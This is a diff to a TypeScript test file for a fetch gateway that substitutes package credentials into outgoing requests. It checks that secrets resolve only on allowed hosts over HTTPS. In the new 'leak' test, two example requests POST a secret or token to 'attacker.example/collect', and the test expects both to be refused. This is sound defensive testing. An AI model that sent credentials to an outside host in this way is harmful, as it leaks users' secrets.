@@ -367,14 +367,19 @@ test('ambient fetch placeholders require secret:use / integration:use for member
 	})
 })
 
-test('leak: a declared package credential is refused outside its placement, in the URL, or over plain HTTP, before it resolves', async () => {
+async function setupDeclaredPackage(input: {
+	username: string
+	packageName: string
+}) {
 	const db = await createOrgDb()
-	const ownerStableId = testStableUserIdFromEmail('owner-p@example.com')
+	const ownerStableId = testStableUserIdFromEmail(
+		`${input.username}@example.com`,
+	)
 	const ownerId = ownerIdFromStored(ownerStableId)
 	const now = '2026-10-11T00:00:00.000Z'
 	await provisionPersonalOrg(db, {
 		stableUserId: ownerId,
-		username: 'ownerp',
+		username: input.username,
 		createdAt: now,
 	})
 	const packageId = crypto.randomUUID()
@@ -383,9 +388,9 @@ test('leak: a declared package credential is refused outside its placement, in t
 		{
 			id: packageId,
 			user_id: ownerId,
-			name: '@ownerp/mailer',
-			kody_id: 'mailer',
-			description: 'mailer',
+			name: input.packageName,
+			kody_id: input.packageName.split('/')[1]!,
+			description: 'test package',
 			tags_json: '[]',
 			search_text: null,
 			source_id: `source-${packageId}`,
@@ -399,47 +404,16 @@ test('leak: a declared package credential is refused outside its placement, in t
 		null,
 		{ stamp: false },
 	)
-	const manifestSpy = mockPackageManifest('@ownerp/mailer', {
-		RESEND_API_KEY: {
-			kind: 'secret',
-			provider: 'resend',
-			description: 'Resend API key.',
-			placement: { header: 'Authorization', template: 'Bearer {value}' },
-		},
-		GOOGLE: { kind: 'oauth', provider: 'google', description: 'Google.' },
-		CLIENT_ID: {
-			kind: 'secret',
-			provider: 'acme',
-			description: 'Acme client id.',
-			placement: { header: 'Authorization' },
-		},
-		CLIENT_SECRET: {
-			kind: 'secret',
-			provider: 'acme',
-			description: 'Acme client secret.',
-			placement: { header: 'Authorization', template: 'Basic {value}' },
-		},
-	})
-	const resolveSpy = vi
-		.spyOn(secretService, 'resolveSecret')
-		.mockResolvedValue(userSecret('resend-secret-value', ['api.resend.com']))
-	const tokenSpy = vi
-		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
-		.mockResolvedValue('google-access')
-	vi.spyOn(
-		integrationPackageAccess,
-		'assertCanUseIntegration',
-	).mockResolvedValue(undefined)
-	vi.spyOn(integrationService, 'getJoinedIntegration').mockResolvedValue({
-		lane: 'user',
-		app: { apiBaseUrl: 'https://api.resend.com' },
-		connection: { requiredHosts: ['api.resend.com'] },
-	} as never)
-
 	const ownerRequest = deriveRequestContext({
-		user: { userId: personIdFromStored(ownerStableId), username: 'ownerp' },
+		user: {
+			userId: personIdFromStored(ownerStableId),
+			username: input.username,
+		},
 		source: { kind: 'mcp-oauth' },
-		orgBinding: { org: { id: ownerId, slug: 'ownerp' }, role: 'owner' },
+		orgBinding: {
+			org: { id: ownerId, slug: input.username },
+			role: 'owner',
+		},
 	})
 	const env = {
 		APP_DB: db,
@@ -465,161 +439,24 @@ test('leak: a declared package credential is refused outside its placement, in t
 			},
 			env,
 		}).then(({ request: expanded }) => expanded)
-	const refusal = async (url: string, init: RequestInit = {}) =>
-		String(
-			await expandAsPackage(url, init).then(
-				() => {
-					throw new Error(`Expected ${url} to be refused.`)
-				},
-				(error: unknown) => error,
-			),
-		)
+	return { expandAsPackage }
+}
 
-	const sent = await expandAsPackage('https://api.resend.com/emails', {
-		headers: { Authorization: 'Bearer {{secret:RESEND_API_KEY}}' },
-	})
-	expect(sent.headers.get('Authorization')).toBe('Bearer resend-secret-value')
-	const google = await expandAsPackage('https://api.resend.com/emails', {
-		headers: { Authorization: 'Bearer {{integration-token:GOOGLE}}' },
-	})
-	expect(google.headers.get('Authorization')).toBe('Bearer google-access')
-	const basicPair = '{{secret-basic:username=CLIENT_ID,password=CLIENT_SECRET}}'
-	const basic = await expandAsPackage('https://api.resend.com/token', {
-		headers: { Authorization: `Basic ${basicPair}` },
-	})
-	expect(basic.headers.get('Authorization')).toBe(
-		`Basic ${btoa('resend-secret-value:resend-secret-value')}`,
-	)
-	resolveSpy.mockClear()
-	tokenSpy.mockClear()
-
-	// Outside the declared header or template.
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { 'X-Api-Key': '{{secret:RESEND_API_KEY}}' },
-		}),
-	).toContain(
-		'Slot "RESEND_API_KEY" of @ownerp/mailer may only be sent in its declared header "Authorization" (as "Bearer {value}"), not in "x-api-key".',
-	)
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { Authorization: 'Token {{secret:RESEND_API_KEY}}' },
-		}),
-	).toContain(
-		'Slot "RESEND_API_KEY" of @ownerp/mailer must be sent as "Authorization: Bearer {value}"',
-	)
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { Authorization: 'bearer {{secret:RESEND_API_KEY}}' },
-		}),
-	).toContain('must be sent as "Authorization: Bearer {value}"')
-	expect(
-		await refusal('https://api.resend.com/token', {
-			headers: { Authorization: `X Basic ${basicPair}` },
-		}),
-	).toContain(
-		`Header "authorization" must be exactly "Basic ${basicPair}" to send slots of @ownerp/mailer as Basic Auth.`,
-	)
-	expect(
-		await refusal('https://api.resend.com/token', {
-			headers: {
-				Authorization:
-					'Basic {{secret-basic:username=CLIENT_ID,password=RESEND_API_KEY}}',
-			},
-		}),
-	).toContain(
-		'Slot "RESEND_API_KEY" of @ownerp/mailer declares template "Bearer {value}", but a Basic Auth pair is sent as "Basic {value}".',
-	)
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { 'X-Token': 'Bearer {{integration-token:GOOGLE}}' },
-		}),
-	).toContain(
-		'Slot "GOOGLE" of @ownerp/mailer may only be sent in its declared header "Authorization"',
-	)
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { Authorization: 'Bearer {{secret:OTHER_KEY}}' },
-		}),
-	).toContain('"OTHER_KEY" is not a kody.credentials slot of @ownerp/mailer.')
-	expect(
-		await refusal('https://api.resend.com/emails', {
-			headers: { Authorization: 'Bearer {{secret:GOOGLE}}' },
-		}),
-	).toContain(
-		'Slot "GOOGLE" of @ownerp/mailer has kind "oauth", but {{secret:GOOGLE}} needs a slot of kind "secret".',
-	)
-
-	// Outside every header: URL and query.
-	expect(
-		await refusal(
-			'https://api.resend.com/emails?key={{secret:RESEND_API_KEY}}',
-		),
-	).toContain('Secret "RESEND_API_KEY" is in the request URL.')
-
-	// Plain HTTP, even in the declared header.
-	expect(
-		await refusal('http://api.resend.com/emails', {
-			headers: { Authorization: 'Bearer {{secret:RESEND_API_KEY}}' },
-		}),
-	).toContain(
-		'Secret "RESEND_API_KEY" cannot be sent over plain HTTP. The fetch gateway substitutes secrets only over HTTPS.',
-	)
-
-	expect(resolveSpy).not.toHaveBeenCalled()
-	expect(tokenSpy).not.toHaveBeenCalled()
-	// One manifest read per run, however many fetches it makes.
-	expect(manifestSpy).toHaveBeenCalledTimes(1)
-})
-
-test('leak: a published slot that fails the slot schema is refused with its error, and its valid siblings still send', async () => {
-	const db = await createOrgDb()
-	const ownerStableId = testStableUserIdFromEmail('owner-q@example.com')
-	const ownerId = ownerIdFromStored(ownerStableId)
-	const now = '2026-10-11T00:00:00.000Z'
-	await provisionPersonalOrg(db, {
-		stableUserId: ownerId,
-		username: 'ownerq',
-		createdAt: now,
-	})
-	const packageId = crypto.randomUUID()
-	await insertSavedPackage(
-		db,
-		{
-			id: packageId,
-			user_id: ownerId,
-			name: '@ownerq/mailer',
-			kody_id: 'mailer',
-			description: 'mailer',
-			tags_json: '[]',
-			search_text: null,
-			source_id: `source-${packageId}`,
-			has_app: 0,
-			has_skills: 0,
-			hidden: 0,
-			is_private: 1,
-			created_at: now,
-			updated_at: now,
-		},
-		null,
-		{ stamp: false },
-	)
-	mockPackageManifest('@ownerq/mailer', {
+test('leak: a declared package fills its credentials anywhere on an allowed host over HTTPS, and is refused elsewhere before they resolve', async () => {
+	mockPackageManifest('@ownerp/mailer', {
 		RESEND_API_KEY: {
 			kind: 'secret',
 			provider: 'resend',
 			description: 'Resend API key.',
-			placement: { header: 'X-Kody-Key' },
 		},
 		GOOGLE: { kind: 'oauth', provider: 'google', description: 'Google.' },
 	})
 	const resolveSpy = vi
 		.spyOn(secretService, 'resolveSecret')
 		.mockResolvedValue(userSecret('resend-secret-value', ['api.resend.com']))
-	vi.spyOn(
-		integrationCredentials,
-		'resolveIntegrationAccessToken',
-	).mockResolvedValue('google-access')
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('google-access')
 	vi.spyOn(
 		integrationPackageAccess,
 		'assertCanUseIntegration',
@@ -629,59 +466,119 @@ test('leak: a published slot that fails the slot schema is refused with its erro
 		app: { apiBaseUrl: 'https://api.resend.com' },
 		connection: { requiredHosts: ['api.resend.com'] },
 	} as never)
-	const env = {
-		APP_DB: db,
-		...createInMemoryUserMeterEnv().env,
-		COOKIE_SECRET: 'test-cookie-secret',
-		SECRET_STORE_KEY: 'test-secret-store-key-32-chars-minimum',
-	} as unknown as Env
-	const expandAsPackage = (headers: Record<string, string>) =>
-		expandSecretPlaceholders({
-			request: new Request('https://api.resend.com/emails', { headers }),
-			props: {
-				baseUrl: 'https://example.com',
-				userId: ownerId,
-				email: null,
-				request: deriveRequestContext({
-					user: {
-						userId: personIdFromStored(ownerStableId),
-						username: 'ownerq',
-					},
-					source: { kind: 'mcp-oauth' },
-					orgBinding: { org: { id: ownerId, slug: 'ownerq' }, role: 'owner' },
-				}),
-				storageContext: {
-					sessionId: null,
-					appId: packageId,
-					packageId,
-					storageId: packageId,
-				},
-				grantedSecretAuthorityPackageIds: [packageId],
-			},
-			env,
-		}).then(({ request: expanded }) => expanded)
-
-	const google = await expandAsPackage({
-		Authorization: 'Bearer {{integration-token:GOOGLE}}',
+	const { expandAsPackage } = await setupDeclaredPackage({
+		username: 'ownerp',
+		packageName: '@ownerp/mailer',
 	})
-	expect(google.headers.get('Authorization')).toBe('Bearer google-access')
 
-	const refusal = await expandAsPackage({
-		'X-Kody-Key': '{{secret:RESEND_API_KEY}}',
-	}).then(
-		() => {
-			throw new Error('Expected the invalid slot to be refused.')
-		},
-		(error: unknown) => String(error),
+	const header = await expandAsPackage('https://api.resend.com/emails', {
+		headers: { 'X-Api-Key': '{{secret:RESEND_API_KEY}}' },
+	})
+	expect(header.headers.get('X-Api-Key')).toBe('resend-secret-value')
+	const query = await expandAsPackage(
+		'https://api.resend.com/emails?key={{secret:RESEND_API_KEY}}',
 	)
-	expect(refusal).toContain(
-		'Slot "RESEND_API_KEY" of @ownerq/mailer is invalid in its published package.json, so the fetch gateway does not substitute it:\nkody.credentials.RESEND_API_KEY.placement.header: x-kody-* headers are reserved for Kody.\nFix the slot and publish again.',
-	)
-	// The package stays declared: an undeclared name is still refused.
+	expect(new URL(query.url).searchParams.get('key')).toBe('resend-secret-value')
+	const body = await expandAsPackage('https://api.resend.com/oauth/token', {
+		method: 'POST',
+		headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+		body: 'grant_type=x&access_token={{integration-token:GOOGLE}}',
+	})
+	expect(await body.text()).toBe('grant_type=x&access_token=google-access')
+	resolveSpy.mockClear()
+	tokenSpy.mockClear()
+
 	await expect(
-		expandAsPackage({ 'X-Api-Key': '{{secret:OTHER_KEY}}' }),
-	).rejects.toThrow(
-		'"OTHER_KEY" is not a kody.credentials slot of @ownerq/mailer.',
-	)
+		expandAsPackage('http://api.resend.com/emails', {
+			method: 'POST',
+			body: JSON.stringify({ key: '{{secret:RESEND_API_KEY}}' }),
+		}),
+	).rejects.toMatchObject({
+		code: 'credential_placement_refused',
+		slot: 'RESEND_API_KEY',
+		message: expect.stringContaining(
+			'Secret "RESEND_API_KEY" cannot be sent to host "api.resend.com" over plain HTTP.',
+		),
+	})
 	expect(resolveSpy).not.toHaveBeenCalled()
+
+	await expect(
+		expandAsPackage('https://attacker.example/collect', {
+			method: 'POST',
+			body: 'token={{integration-token:GOOGLE}}',
+		}),
+	).rejects.toMatchObject({
+		code: 'credential_placement_refused',
+		slot: 'GOOGLE',
+		message: expect.stringContaining('"attacker.example"'),
+	})
+	await expect(
+		expandAsPackage('https://attacker.example/collect', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({ key: '{{secret:RESEND_API_KEY}}' }),
+		}),
+	).rejects.toMatchObject({
+		code: 'credential_placement_refused',
+		slot: 'RESEND_API_KEY',
+		message: expect.stringContaining('attacker.example'),
+	})
+	expect(tokenSpy).not.toHaveBeenCalled()
+})
+
+test('regression: @kody/bluesky createSession sends the identifier and app password ref in its JSON body', async () => {
+	// The @kody/bluesky 1.1.0 manifest as published, raw slot included.
+	const blueskyManifest = parseAuthoredPackageJson({
+		content: JSON.stringify({
+			name: '@kody/bluesky',
+			exports: { '.': './src/index.ts' },
+			kody: {
+				id: 'bluesky',
+				description:
+					'Bluesky and AT Protocol helpers for profiles, posts, and search.',
+				credentials: {
+					blueskyAppPassword: {
+						kind: 'secret',
+						provider: 'bluesky',
+						description: 'Bluesky app password.',
+						raw: true,
+					},
+				},
+			},
+		}),
+		mode: 'published',
+	})
+	expect(
+		blueskyManifest.kody.invalidCredentialSlots?.blueskyAppPassword,
+	).toMatch(/raw/)
+	vi.spyOn(packageSource, 'loadPackageManifestBySourceId').mockResolvedValue({
+		source: {} as packageSource.LoadedPackageManifest['source'],
+		manifest: blueskyManifest,
+	})
+	const appPassword = 'abcd-efgh-ijkl-mnop'
+	vi.spyOn(secretService, 'resolveSecret').mockResolvedValue(
+		userSecret(appPassword, ['bsky.social', '*.bsky.network']),
+	)
+	const { expandAsPackage } = await setupDeclaredPackage({
+		username: 'kody',
+		packageName: '@kody/bluesky',
+	})
+
+	// What createSession builds from packageSecrets.get's opaque ref.
+	const password = '{{secret:blueskyAppPassword|scope=user}}'
+	const sent = await expandAsPackage(
+		'https://bsky.social/xrpc/com.atproto.server.createSession',
+		{
+			method: 'POST',
+			headers: { 'content-type': 'application/json' },
+			body: JSON.stringify({ identifier: 'kody.bsky.social', password }),
+		},
+	)
+	expect(sent.url).toBe(
+		'https://bsky.social/xrpc/com.atproto.server.createSession',
+	)
+	expect(JSON.parse(await sent.text())).toEqual({
+		identifier: 'kody.bsky.social',
+		password: appPassword,
+	})
 })
